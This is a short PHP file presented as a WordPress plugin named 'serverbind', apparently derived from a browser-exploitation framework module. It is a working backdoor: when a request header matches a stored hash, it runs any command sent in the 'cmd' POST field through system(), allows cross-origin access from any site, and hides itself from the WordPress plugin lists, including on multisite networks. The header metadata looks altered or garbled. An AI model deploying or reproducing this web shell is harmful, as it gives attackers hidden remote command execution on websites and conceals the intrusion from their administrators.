<?php
/**
 * Plugin Name: serverbind
 * Plugin URI: https://serverproject.com
 * Description: Server bind shell with CORS.
 * Version: 1.1
 * Authors: Bart Leppens, Erwan LR (@erwan_lr | WPScanTeam)
 * Author URI: https://twitter.com/bmantra
 * License: Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net - Browser Exploitation Framework (Server) - https://serverproject.com - See the file 'doc/COPYING' for copying permission
**/

header("Access-Control-Allow-Origin: *");

define('SHA1_HASH', '#SHA1HASH#');
define('SERVER_PLUGIN', 'serverbind/serverbind.php');

if (isset($_SERVER['HTTP_SERVER']) && strlen($_SERVER['HTTP_SERVER']) > 1) {
	if (strcasecmp(sha1($_SERVER['HTTP_SERVER']), SHA1_HASH) === 0) {
		if (isset($_POST['cmd']) && strlen($_POST['cmd']) > 0) {
			echo system($_POST['cmd']);
		}
	}
}

if (defined('WPINC')) {
	function hide_plugin() {
	    global $wp_list_table;
	    
	    foreach ($wp_list_table->items as $key => $val) {
	        if ($key == SERVER_PLUGIN) { unset($wp_list_table->items[$key]); }
	    }
	}
	add_action('pre_current_active_plugins', 'hide_plugin');

	// For Multisites
	function hide_plugin_from_network($plugins) {
	    if (in_array(SERVER_PLUGIN, array_keys($plugins))) { unset($plugins[SERVER_PLUGIN]); }

	    return $plugins;
	}
	add_filter('all_plugins', 'hide_plugin_from_network');
}
?>